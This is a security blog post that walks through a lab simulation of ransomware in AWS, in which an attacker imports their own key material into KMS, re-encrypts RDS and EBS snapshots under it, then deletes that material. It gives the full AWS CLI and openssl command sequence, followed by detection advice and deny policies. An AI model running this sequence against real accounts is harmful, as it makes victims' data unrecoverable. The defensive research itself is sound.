<!DOCTYPE html>

<html>

  <head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  
  

  

  
  

  <title>
    Simulating Ransomware with AWS KMS - Heilan Cyber
    
  </title>

  <meta name="description" content="How attackers can abuse AWS KMS with BYOK and external key material to simulate ransomware in cloud environments.">

  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="/assets/vendor/bootstrap/css/bootstrap.min.css">

  <link rel="icon" type="image/png" href="/img/favicon.ico">


  <link rel="stylesheet" href="/assets/vendor/font-awesome/css/font-awesome.min.css">

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html">
  <link rel="alternate" type="application/rss+xml" title="Heilan Cyber" href="/feed.xml">
  
  <!-- Open Graph -->
  <meta property="og:site_name" content="Heilan Cyber">
  <meta property="og:title" content="
    
      Simulating Ransomware with AWS KMS
    
  ">
  <meta property="og:description" content="
    
      How attackers can abuse AWS KMS with BYOK and external key material to simulate ransomware in cloud environments.
    
  ">
  <meta property="og:url" content="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html">
  <meta property="og:type" content="article">
  <meta property="og:image" content="https://heilancoos.github.io/img/kms-ransomware/kms-ransomware-diagram.png">

   <!-- Twitter Card -->
  
    <meta name="twitter:card" content="summary_large_image">
  
  <meta name="twitter:title" content="
    
      Simulating Ransomware with AWS KMS
    
  ">
  <meta name="twitter:description" content="
    
      How attackers can abuse AWS KMS with BYOK and external key material to simulate ransomware in cloud environments.
    
  ">
  <meta name="twitter:image" content="https://heilancoos.github.io/img/kms-ransomware/kms-ransomware-diagram.png">
  <meta name="twitter:site" content="@">
  <meta name="twitter:creator" content="@">
</head>


  <body>

    <!-- Navigation -->
<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
  <div class="container">
    <!-- <a class="navbar-brand" href="/">Start Bootstrap</a> -->
    <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
      Menu
      <i class="fa fa-bars"></i>
    </button>
    <div class="collapse navbar-collapse" id="navbarResponsive">
      <ul class="navbar-nav ml-auto mr-auto">
        <li class="nav-item">
          <a class="nav-link" href="/">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="/categories">Categories</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="/about">About</a>
        </li>
      </ul>
    </div>
  </div>
</nav>


    <script>
  function copyToClipboard(){
    //console.log(`Copied ${window.location.href}`);
    var textArea = document.createElement("textarea");
    textArea.value = window.location.href;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand("Copy");
    textArea.remove();

    var tooltip = document.getElementById("tooltiptext");
    tooltip.innerHTML = "Link copied";
  }

  function outFunc() {
    var tooltip = document.getElementById("tooltiptext");
    tooltip.innerHTML = "Copy Link";
  }
</script>
<!-- Page Header -->

<header class="masthead" style="background-image: url('/img/kms-ransomware/kms-ransomware-diagram.png')">

  <div class="overlay"></div>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-md-10 mx-auto">
        <div class="post-heading">
          <h1>Simulating Ransomware with AWS KMS</h1>
          <span class="meta">HC / September 02, 2025</span>
        </div>
      </div>
    </div>
  </div>
</header>

<div class="container">
  <div class="row">
    <div class="col-lg-10 col-md-10 mx-auto post-body">

      <h2 id="introduction">Introduction</h2>

<p>The AWS Key Management Service (KMS) allows customers to create and manage encryption keys for their cloud resources,  with similar services existing in <a href="https://learn.microsoft.com/en-us/azure/security/fundamentals/key-management">Azure</a> and <a href="https://cloud.google.com/security/products/security-key-management?hl=en">Google Cloud Platform (GCP)</a>. KMS is essential for customers to properly secure their resources in the shared responsibility model. AWS makes it clear that while they provide the service and ensure the service itself is secure, it is the customer’s responsibility for how the service is used and how keys are protected.</p>

<p>In early 2025, <a href="https://www.halcyon.ai/blog/abusing-aws-native-services-ransomware-encrypting-s3-buckets-with-sse-c">Halcyon attributed</a> the APT group “Codefinger” as the perpetrators of a new ransomware campaign. The threat actors took advantage of AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt S3 buckets containing sensitive data. Because the encryption keys never resided within AWS, there is no recovery path other than paying the ransom. In a similar way as SSE-C, KMS is designed to simplify key management but can be turned against customers.</p>

<p>I first came across this technique reading a blog by <a href="https://www.chrisfarris.com/post/effective-aws-ransomware/">Chris Farris</a> and wanted to test it out in a lab environment for myself to understand how the attack works and see what can be done to prevent or mitigate it.</p>

<p>This post walks through KMS abuse end-to-end in Relational Database Service (RDS) and Elastic Block Store (EBS) and discusses afterwards what customers can do to better protect their environments.</p>

<h2 id="different-key-types-in-kms">Different Key Types in KMS</h2>

<p>KMS launched initially in November 2014, and since then has been integrated deeply into the AWS ecosystem. It provides encryption services for several relevant AWS services like EBS, EC2, RDS, Simple Email Service (SES), Simple Queue Service (SQS), S3, DynamoDB, SecretsManager, and many more. Encryption can be as simple as checking a box and specifying a key when launching a resource.</p>

<p>There are three types of keys within KMS:</p>

<ul>
  <li>AWS-owned</li>
  <li>AWS-managed</li>
  <li>Customer-managed keys (CMKs)</li>
</ul>

<p>AWS-owned keys are fully managed by the AWS service that encrypts the customer’s data. The customer has no visibility or control for these types of keys.<br />
AWS-managed keys are the default for most services. These keys are in the format of: <code class="language-plaintext highlighter-rouge">aws/&lt;service&gt;</code> and can only be used for a specific service.  AWS-managed keys are a quick and easy way for customers to enable encryption without additional overhead.</p>

<p>Customer Managed Keys are keys that the customer creates and manages. These keys allow customers to have complete control over their keys.</p>

<p>This post focuses on customer-managed keys that have their origin set to <code class="language-plaintext highlighter-rouge">EXTERNAL</code>. Similar to how Codefinger used SSE-C to ransom customers, these keys allow imported key material which attackers can use for their own ends.</p>

<h2 id="how-the-technique-works">How the Technique Works</h2>

<p>In 2016, AWS KMS launched a feature that <a href="https://aws.amazon.com/blogs/security/how-to-byok-bring-your-own-key-to-aws-kms-for-less-than-15-00-a-year-using-aws-cloudhsm/">allowed customers to use their own key material</a> for KMS-integrated AWS services. This feature was meant to hand the control back over to the customer completely. That control, however, comes with its own risks. If the imported material is deleted within AWS, AWS has no ability to recover it and dependent resources become inaccessible.</p>

<p>In his blog, Chris Farris outlines how threat actors can leverage this feature combined with common Identity Access Management (IAM) misconfigurations in order to execute a ransomware technique that prevents  data from being recovered by deleting the imported key material after encryption.</p>

<p>The attack path that Chris describes in his blog is fairly straightforward.</p>

<ol>
  <li>Attacker gains IAM privileges that allow <code class="language-plaintext highlighter-rouge">kms:CreateKey</code>, <code class="language-plaintext highlighter-rouge">kms:GetParametersForImport</code>, <code class="language-plaintext highlighter-rouge">kms:ImportKeyMaterial</code>, and <code class="language-plaintext highlighter-rouge">kms:ReplicateKey</code></li>
  <li>They create their own <strong>external</strong> KMS key.</li>
  <li>They import their own key material.</li>
  <li>They re-encrypt sensitive AWS resources.</li>
  <li>They delete the imported key material, rendering the key unusable for decryption.</li>
</ol>

<p><img src="/img/kms-ransomware/attack-diagram-big.png" alt="image01" width="720" class="mx-auto d-block" /></p>

<p>Once the attacker deletes the imported key material, the resources encrypted with the external key will still reference it. This means that these resources cannot have any read or write actions performed on them past this point as AWS can no longer use the specified key for decryption.</p>

<h2 id="a-practical-showcase">A Practical Showcase</h2>

<p>Let’s walk through how an attacker would exploit this step-by-step. First, here are the minimum permissions they would require in KMS:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Permissions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:ImportKeyMaterial</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:CreateKey</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:CreateGrant</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:GetParametersForImport</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:DeleteImportedKeyMaterial</code></td>
    </tr>
  </tbody>
</table>

<p>And here are the permissions they would need in RDS and EBS respectively:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">RDS Permissions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:CopyDBSnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:CreateDBSnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:DescribeDBInstances</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:RestoreDBFromDBSnapshot</code></td>
    </tr>
  </tbody>
</table>

<table>
  <thead>
    <tr>
      <th style="text-align: left">EBS Permissions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:DescribeVolumes</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:CreateSnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:CopySnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:DeleteSnapshot</code></td>
    </tr>
  </tbody>
</table>

<p>Once an attacker has obtained valid credentials and access to permissions that allow KMS actions, they can perform the following steps:</p>

<p>Create a customer-managed KMS key with the origin set to <code class="language-plaintext highlighter-rouge">EXTERNAL</code>. Note that imported material is only supported for symmetric keys. Running the command below will create a disabled key that is in the state ‘PendingImport’.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms create-key --key-usage ENCRYPT_DECRYPT --key-spec SYMMETRIC_DEFAULT --origin EXTERNAL
</code></pre></div></div>

<p><img src="/img/kms-ransomware/create-key.png" alt="image2" width="720" class="mx-auto d-block" /></p>

<p>Retrieve parameters for import, this is so you can save the import token and public key. These are temporary and must be used together. Ensure to Base64 decode them to get the raw binary input.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms get-parameters-for-import --key-id &lt;key-id&gt; --wrapping-algorithm RSAES_OAEP_SHA_1 --wrapping-key-spec RSA_2048
</code></pre></div></div>

<p><img src="/img/kms-ransomware/get-params-for-import.png" alt="image3" width="720" class="mx-auto d-block" /></p>

<p>Generate a 32-byte key material blob locally using openssl.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rand -out key_material_file 32
</code></pre></div></div>

<p>Then wrap the key material using the public key.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsautl -encrypt -oaep -inkey public_key.pem -pubin -in key_material_file -out encrypted_key_material.bin
</code></pre></div></div>

<p>We’ll use <code class="language-plaintext highlighter-rouge">encrypted_key_material.bin</code> for our import.</p>

<p><strong>NOTE</strong>: Make sure to keep a copy of this file if you want to eventually restore the AWS resources. This is the only thing that can restore access to resources encrypted under this key material.</p>

<p>Import Key Material. Once the key material is imported, the key is enabled for use.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms import-key-material --key-id &lt;key-id&gt; --encrypted-key-material fileb://encrypted_key_material.bin --import-token fileb://import_token.bin --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE
</code></pre></div></div>

<p><img src="/img/kms-ransomware/import-key-material.png" alt="image4" width="720" class="mx-auto d-block" /></p>

<p>Now the resource is fully encrypted, only allowing the attacker to decrypt the potentially sensitive data.</p>

<h3 id="alternative-leveraging-an-existing-key"><strong>Alternative: Leveraging an existing key</strong></h3>

<p>If the attacker doesn’t have the <code class="language-plaintext highlighter-rouge">kms:CreateKey</code> permission, they can rotate existing <code class="language-plaintext highlighter-rouge">EXTERNAL</code> keys to attacker-controlled material if they have <code class="language-plaintext highlighter-rouge">kms:RotateKeyOnDemand</code>.</p>

<p>The attacker can import new material into an existing key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms import-key-material <span class="se">\</span>
 <span class="nt">--key-id</span> &lt;key-id&gt; <span class="se">\</span>
 <span class="nt">--import-type</span> NEW_KEY_MATERIAL <span class="se">\</span>
 <span class="nt">--encrypted-key-material</span> fileb://encrypted_key_material.bin <span class="se">\</span>
 <span class="nt">--import-token</span> fileb://import_token.bin <span class="se">\</span>
 <span class="nt">--expiration-model</span> KEY_MATERIAL_DOES_NOT_EXPIRE
</code></pre></div></div>

<p><img src="/img/kms-ransomware/import-type-new-key-material.png" alt="image5" width="720" class="mx-auto d-block" /></p>

<p>At this point the new material won’t be active yet. It will be in the state <code class="language-plaintext highlighter-rouge">PendingRotation</code>.</p>

<p><img src="/img/kms-ransomware/pending-rotation.png" alt="image6" width="720" class="mx-auto d-block" /></p>

<p>Then to actually rotate the key:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms rotate-key-on-demand --key-id &lt;KEY_ID&gt;
</code></pre></div></div>

<p>The caveat here is that rotating on demand can only be done 10 times per key. This is also exclusive to single-region, symmetric keys. Additionally, once the current imported material is deleted, you cannot rotate the key again.</p>

<h3 id="rds"><strong>RDS</strong></h3>

<p>For this example, we are using a database that is already encrypted. With this technique, the attacker will be able to<em>overwrite</em>the existing encryption, taking control away from the customer.</p>

<p><img src="/img/kms-ransomware/db-console.png" alt="image7" width="720" class="mx-auto d-block" /></p>

<p><img src="/img/kms-ransomware/db-console-encrypted.png" alt="image8" width="420" class="mx-auto d-block" /></p>

<p>The first thing the attacker has to do is create a snapshot. It is not possible to change the encryption key/status of a running database.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds create-db-snapshot --db-snapshot-identifier copy-pasturedb --db-instance-identifier pasturedb
</code></pre></div></div>

<p><img src="/img/kms-ransomware/create-db-snapshot.png" alt="image9" width="720" class="mx-auto d-block" /></p>

<p>Copy the DB Snapshot. In this step it is possible for an attacker to change the newly created snapshot encryption key to their own .</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds copy-db-snapshot --source-db-snapshot-identifier copy-pasturedb --target-db-snapshot-identifier ransom-pasturedb --kms-key-id &lt;key-id&gt;
</code></pre></div></div>

<p><img src="/img/kms-ransomware/copy-db-snapshot.png" alt="image10" width="720" class="mx-auto d-block" /></p>

<p>Looking in the console, the snapshot is now available. At this point, the attacker can delete the original database and snapshots.</p>

<p><img src="/img/kms-ransomware/snap-in-console.png" alt="image11" width="720" class="mx-auto d-block" /></p>

<p>Now let’s see what happens when we delete the imported key material and try to perform actions with the snapshot:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms delete-imported-key-material --key-id &lt;key-id&gt;

</code></pre></div></div>

<p><img src="/img/kms-ransomware/delete-imported-key.png" alt="image12" width="720" class="mx-auto d-block" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds copy-db-snapshot --source-db-snapshot-identifier ransom-pasturedb --target-db-snapshot-identifier ransom-pasturedb2
</code></pre></div></div>

<p><img src="/img/kms-ransomware/copydbfail.png" alt="image13" width="720" class="mx-auto d-block" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds restore-db-instance-from-db-snapshot --db-instance-identifier ransomedDB --db-snapshot-identifier ransom-pasturedb
</code></pre></div></div>

<p><img src="/img/kms-ransomware/restore-db.png" alt="image14" width="720" class="mx-auto d-block" /></p>

<h3 id="ebs"><strong>EBS</strong></h3>

<p>Similarly in EBS, volumes cannot be encrypted directly. These steps are similar to the RDS steps.</p>

<p>Create a volume snapshot within the same region.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws ec2 create-snapshot --region us-east-1 --volume-id &lt;vol-id&gt;
</code></pre></div></div>

<p><img src="/img/kms-ransomware/ec2-create-snapshot.png" alt="image15" width="720" class="mx-auto d-block" /></p>

<p>Copy the newly created snapshot and use the attacker key to encrypt an attacker controlled snapshot.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws ec2 copy-snapshot --region us-east-1 --source-region us-east-1 --source-snapshot-id &lt;snap-id&gt; --encrypted --kms-key-id &lt;key-id&gt;
</code></pre></div></div>

<p><img src="/img/kms-ransomware/ec2-copy-snapshot.png" alt="image16" width="720" class="mx-auto d-block" /></p>

<p>Delete imported key material.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms delete-imported-key-material --key-id 8a5bf6e0-bc70-47fb-9d13-a98bb8afb5f2
</code></pre></div></div>

<p><img src="/img/kms-ransomware/delete2.png" alt="image17" width="720" class="mx-auto d-block" /></p>

<p>Let’s try copying the snapshot again. It fails as the imported key material is no longer available, displaying a snapshot ID to reference.</p>

<p><img src="/img/kms-ransomware/copyfail.png" alt="image18" width="720" class="mx-auto d-block" /></p>

<p>When referencing the snapshot ID, an error message is shown.</p>

<p><img src="/img/kms-ransomware/describe%20snap.png" alt="image19" width="720" class="mx-auto d-block" /></p>

<h2 id="defensive-strategies">Defensive Strategies</h2>

<p>The technique outlined above relies entirely on legitimate AWS features and configurations, no exploits were utilized. This prevents attack mitigation through patches.</p>

<p>Thankfully, detecting this is relatively straightforward. Any occurrence of <code class="language-plaintext highlighter-rouge">ImportKeyMaterial</code>, <code class="language-plaintext highlighter-rouge">RotateKeyOnDemand</code>, or <code class="language-plaintext highlighter-rouge">DeleteImportedKeyMaterial</code> should be considered suspicious. AWS EventBridge rules can be configured to trigger alerts on these calls.</p>

<p>Beyond just that, as <a href="https://www.fogsecurity.io/blog/the-complete-guide-to-ransomware-protection-in-s3-and-kms">Fog Security</a> has documented, it is  possible to  restrict the creation of external keys and the ability to use them with the policies below.  If your organization does not require <code class="language-plaintext highlighter-rouge">EXTERNAL</code> origin keys, the safest mitigation is to block them entirely.</p>

<p>Service Control Policy: <strong>Deny creation of <code class="language-plaintext highlighter-rouge">EXTERNAL</code> keys</strong></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">

  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">

  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">

    </span><span class="p">{</span><span class="w">

      </span><span class="nl">"Sid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DenyKMSKeysCreationWithNonAWSKMSMaterial"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Deny"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"kms:CreateKey"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Condition"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">

        </span><span class="nl">"StringNotEquals"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">

          </span><span class="nl">"kms:KeyOrigin"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AWS_KMS"</span><span class="w">

        </span><span class="p">}</span><span class="w">

      </span><span class="p">}</span><span class="w">

    </span><span class="p">}</span><span class="w">

  </span><span class="p">]</span><span class="w">

</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Resource Control Policy: <strong>Deny use of <code class="language-plaintext highlighter-rouge">EXTERNAL</code> keys</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{

  "Version": "2012-10-17",

  "Statement": [

    {

      "Sid": "RestrictUsageOfNonAWSKMSKeyMaterial",

      "Effect": "Deny",

      "Principal": "*",

      "Action": [

        "kms:Encrypt",

        "kms:GenerateDataKey",

        "kms:GenerateDataKeyWithoutPlaintext",

        "kms:GenerateDataKeyPair",

        "kms:GenerateDataKeyPairWithoutPlaintext",

        "kms:ReEncrypt*"

      ],

      "Resource": "*",

      "Condition": {

        "StringNotEquals": {

          "kms:KeyOrigin": "AWS_KMS"

        }

      }

    }

  ]

}  
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>KMS is one of the most powerful services within AWS, allowing customers to add another layer of security within their environment. However, just like all services within AWS, if the attacker gets ahold of the right permissions, it can wreak havoc in a customer’s AWS environment. AWS has measures to prevent this but it’s ultimately up to the customer to choose their risk level.</p>

<p>I highly recommend reading more about this and similar techniques from <a href="https://www.chrisfarris.com/">Chris Farris</a> and <a href="https://www.fogsecurity.io/blog">Fog Security</a>.</p>

      <div class="tooltipcontainer">
        <img
          onclick="copyToClipboard()"
          onmouseout="outFunc()"
          class="share-icon"
          src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHg9IjBweCIgeT0iMHB4Igp3aWR0aD0iMzIiIGhlaWdodD0iMzIiCnZpZXdCb3g9IjAgMCAxNzIgMTcyIgpzdHlsZT0iIGZpbGw6IzAwMDAwMDsiPjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0ibm9uemVybyIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIHN0cm9rZS1saW5lY2FwPSJidXR0IiBzdHJva2UtbGluZWpvaW49Im1pdGVyIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiIHN0cm9rZS1kYXNoYXJyYXk9IiIgc3Ryb2tlLWRhc2hvZmZzZXQ9IjAiIGZvbnQtZmFtaWx5PSJub25lIiBmb250LXdlaWdodD0ibm9uZSIgZm9udC1zaXplPSJub25lIiB0ZXh0LWFuY2hvcj0ibm9uZSIgc3R5bGU9Im1peC1ibGVuZC1tb2RlOiBub3JtYWwiPjxwYXRoIGQ9Ik0wLDE3MnYtMTcyaDE3MnYxNzJ6IiBmaWxsPSJub25lIj48L3BhdGg+PGcgZmlsbD0iI2ZmMDUwNSI+PGcgaWQ9InN1cmZhY2UxIj48cGF0aCBkPSJNMTM0LjM3NSwxMC43NWMtMTQuNzgxMjUsMCAtMjYuODc1LDEyLjA5Mzc1IC0yNi44NzUsMjYuODc1YzAsMS44NDc2NiAwLjIwOTk2LDMuNjExMzMgMC41NDU5LDUuMzc1bC00OC43MTA5NCwyMS45MTk5M2MtNC45MTMwOCwtNi43MTg3NSAtMTIuODA3NjEsLTExLjE2OTkzIC0yMS43MDk5NiwtMTEuMTY5OTNjLTE0Ljc4MTI1LDAgLTI2Ljg3NSwxMi4wOTM3NSAtMjYuODc1LDI2Ljg3NWMwLDE0Ljc4MTI1IDEyLjA5Mzc1LDI2Ljg3NSAyNi44NzUsMjYuODc1YzguOTQ0MzMsMCAxNi45MjI4NSwtNC40OTMxNyAyMS43OTM5NSwtMTEuMjk1OWw0OC43NTI5MywyMS42Njc5N2MtMC40MTk5MiwxLjg0NzY2IC0wLjY3MTg3LDMuNzc5MjkgLTAuNjcxODcsNS43NTI5M2MwLDE0Ljc4MTI1IDEyLjA5Mzc1LDI2Ljg3NSAyNi44NzUsMjYuODc1YzE0Ljc4MTI1LDAgMjYuODc1LC0xMi4wOTM3NSAyNi44NzUsLTI2Ljg3NWMwLC0xNC43ODEyNSAtMTIuMDkzNzUsLTI2Ljg3NSAtMjYuODc1LC0yNi44NzVjLTguOTQ0MzMsMCAtMTYuOTIyODUsNC40OTMxNyAtMjEuNzkzOTUsMTEuMjk1OWwtNDguNzUyOTMsLTIxLjYyNTk3YzAuNDE5OTMsLTEuODg5NjYgMC42NzE4OCwtMy44MjEyOSAwLjY3MTg4LC01Ljc5NDkzYzAsLTIuMDE1NjIgLTAuMjUxOTUsLTMuOTg5MjYgLTAuNjcxODcsLTUuODc4OTFsNDguNDU4OTksLTIxLjkxOTkyYzQuODcxMDksNy4wNTQ2OSAxMi45NzU1OCwxMS42NzM4MiAyMi4wODc4OSwxMS42NzM4MmMxNC43ODEyNSwwIDI2Ljg3NSwtMTIuMDkzNzUgMjYuODc1LC0yNi44NzVjMCwtMTQuNzgxMjUgLTEyLjA5Mzc1LC0yNi44NzUgLTI2Ljg3NSwtMjYuODc1ek0xMzQuMzc1LDIxLjVjOC45ODYzMywwIDE2LjEyNSw3LjEzODY4IDE2LjEyNSwxNi4xMjVjMCw4Ljk4NjMzIC03LjEzODY3LDE2LjEyNSAtMTYuMTI1LDE2LjEyNWMtOC45ODYzMiwwIC0xNi4xMjUsLTcuMTM4NjcgLTE2LjEyNSwtMTYuMTI1YzAsLTguOTg2MzIgNy4xMzg2OCwtMTYuMTI1IDE2LjEyNSwtMTYuMTI1ek0zNy42MjUsNjQuNWM4Ljk4NjMzLDAgMTYuMTI1LDcuMTM4NjggMTYuMTI1LDE2LjEyNWMwLDguOTg2MzMgLTcuMTM4NjcsMTYuMTI1IC0xNi4xMjUsMTYuMTI1Yy04Ljk4NjMyLDAgLTE2LjEyNSwtNy4xMzg2NyAtMTYuMTI1LC0xNi4xMjVjMCwtOC45ODYzMiA3LjEzODY4LC0xNi4xMjUgMTYuMTI1LC0xNi4xMjV6TTEzNC4zNzUsMTA3LjVjOC45ODYzMywwIDE2LjEyNSw3LjEzODY4IDE2LjEyNSwxNi4xMjVjMCw4Ljk4NjMzIC03LjEzODY3LDE2LjEyNSAtMTYuMTI1LDE2LjEyNWMtOC45ODYzMiwwIC0xNi4xMjUsLTcuMTM4NjcgLTE2LjEyNSwtMTYuMTI1YzAsLTguOTg2MzIgNy4xMzg2OCwtMTYuMTI1IDE2LjEyNSwtMTYuMTI1eiI+PC9wYXRoPjwvZz48L2c+PC9nPjwvc3ZnPg=="
          alt="Share Icon"
        >
        <span id="tooltiptext" class="tooltiptext">Copy Link</span>
      </div>
      <hr>
      <div class="clearfix">

        
        <a class="btn btn-primary float-left" href="/research/2025/07/30/weaponizing.html" data-toggle="tooltip" data-placement="top" title="Weaponizing Reality: The Evolution of Deepfakes">&larr; Previous<span class="d-none d-md-inline"> Post</span></a>
        
        

      </div>

    </div>
  </div>
</div>

    <!-- Footer -->

<hr>

<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-md-10 mx-auto">
        <ul class="list-inline text-center">
          
          
          <li class="list-inline-item">
            <a href="https://linkedin.com/in/" title="LinkedIn">
              <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x"></i>
                <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
              </span>
           </a>
          </li>
          
          
          <li class="list-inline-item">
            <a href="https://github.com/heilancoos">
              <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x"></i>
                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="copyright text-muted">Copyright &copy; HC 2025</p>
      </div>
    </div>
  </div>
</footer>


    <script src="/assets/vendor/jquery/jquery.min.js"></script>
<script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="/assets/vendor/startbootstrap-clean-blog/js/clean-blog.min.js"></script>

<script src="/assets/scripts.js"></script>




  </body>

</html>
